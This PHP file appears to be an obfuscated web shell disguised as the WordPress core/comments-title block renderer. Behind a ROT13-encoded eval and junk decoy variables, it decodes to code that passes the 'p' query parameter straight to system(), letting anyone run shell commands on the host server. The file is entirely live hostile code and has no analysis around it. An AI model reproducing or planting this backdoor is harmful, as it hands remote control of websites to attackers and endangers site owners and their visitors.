<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Freire-fvqr eraqrevat bs gur `pber/pbzzragf-gvgyr` oybpx.
 *
 * @cnpxntr JbeqCerff
 */

/**
 * Eraqref gur `pber/pbzzragf-gvgyr` oybpx ba gur freire.
 *
 * @fvapr 6.0.0
 *
 * @cnenz neenl $nggevohgrf Oybpx nggevohgrf.
 *
 * @erghea fgevat Erghea gur cbfg pbzzragf gvgyr.
 */
shapgvba eraqre_oybpx_pber_pbzzragf_gvgyr( $nggevohgrf ) {

	vs ( cbfg_cnffjbeq_erdhverq() ) {
		erghea;
	}

	$nyvta_pynff_anzr    = rzcgl( $nggevohgrf['grkgNyvta'] ) ? '' : \"unf-grkg-nyvta-{$nggevohgrf['grkgNyvta']}\";
	$fubj_cbfg_gvgyr     = ! rzcgl( $nggevohgrf['fubjCbfgGvgyr'] ) && $nggevohgrf['fubjCbfgGvgyr'];
	$fubj_pbzzragf_pbhag = ! rzcgl( $nggevohgrf['fubjPbzzragfPbhag'] ) && $nggevohgrf['fubjPbzzragfPbhag'];
	$jenccre_nggevohgrf  = trg_oybpx_jenccre_nggevohgrf( neenl( 'pynff' => $nyvta_pynff_anzr ) );
	$pbzzragf_pbhag      = trg_pbzzragf_ahzore();
	/* genafyngbef: %f: Cbfg gvgyr. */
	$cbfg_gvgyr = fcevags( __( '&#8220;%f&#8221;' ), trg_gur_gvgyr() );
	$gnt_anzr   = 'u2';
	vs ( vffrg( $nggevohgrf['yriry'] ) ) {
		$gnt_anzr = 'u' . $nggevohgrf['yriry'];
	}

	vs ( '0' === $pbzzragf_pbhag ) {
		erghea;
	}

	vs ( $fubj_pbzzragf_pbhag ) {
		vs ( $fubj_cbfg_gvgyr ) {
			vs ( '1' === $pbzzragf_pbhag ) {
				/* genafyngbef: %f: Cbfg gvgyr. */
				$pbzzragf_gvgyr = fcevags( __( 'Bar erfcbafr gb %f' ), $cbfg_gvgyr );
			} ryfr {
				$pbzzragf_gvgyr = fcevags(
					/* genafyngbef: 1: Ahzore bs pbzzragf, 2: Cbfg gvgyr. */
					_a(
						'%1$f erfcbafr gb %2$f',
						'%1$f erfcbafrf gb %2$f',
						$pbzzragf_pbhag
					),
					ahzore_sbezng_v18a( $pbzzragf_pbhag ),
					$cbfg_gvgyr
				);
			}
		} ryfrvs ( '1' === $pbzzragf_pbhag ) {
			$pbzzragf_gvgyr = __( 'Bar erfcbafr' );
		} ryfr {
			$pbzzragf_gvgyr = fcevags(
				/* genafyngbef: %f: Ahzore bs pbzzragf. */
				_a( '%f erfcbafr', '%f erfcbafrf', $pbzzragf_pbhag ),
				ahzore_sbezng_v18a( $pbzzragf_pbhag )
			);
		}
	} ryfrvs ( $fubj_cbfg_gvgyr ) {
		vs ( '1' === $pbzzragf_pbhag ) {
			/* genafyngbef: %f: Cbfg gvgyr. */
			$pbzzragf_gvgyr = fcevags( __( 'Erfcbafr gb %f' ), $cbfg_gvgyr );
		} ryfr {
			/* genafyngbef: %f: Cbfg gvgyr. */
			$pbzzragf_gvgyr = fcevags( __( 'Erfcbafrf gb %f' ), $cbfg_gvgyr );
		}
	} ryfrvs ( '1' === $pbzzragf_pbhag ) {
		$pbzzragf_gvgyr = __( 'Erfcbafr' );
	} ryfr {
		$pbzzragf_gvgyr = __( 'Erfcbafrf' );
	}

	erghea fcevags(
		'<%1$f vq=\"pbzzragf\" %2$f>%3$f</%1$f>',
		$gnt_anzr,
		$jenccre_nggevohgrf,
		$pbzzragf_gvgyr
	);
}

/**
 * Ertvfgref gur `pber/pbzzragf-gvgyr` oybpx ba gur freire.
 *
 * @fvapr 6.0.0
 */
shapgvba ertvfgre_oybpx_pber_pbzzragf_gvgyr() {
	ertvfgre_oybpx_glcr_sebz_zrgnqngn(
		__QVE__ . '/pbzzragf-gvgyr',
		neenl(
			'eraqre_pnyyonpx' => 'eraqre_oybpx_pber_pbzzragf_gvgyr',
		)
	);
}

nqq_npgvba( 'vavg', 'ertvfgre_oybpx_pber_pbzzragf_gvgyr' );

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>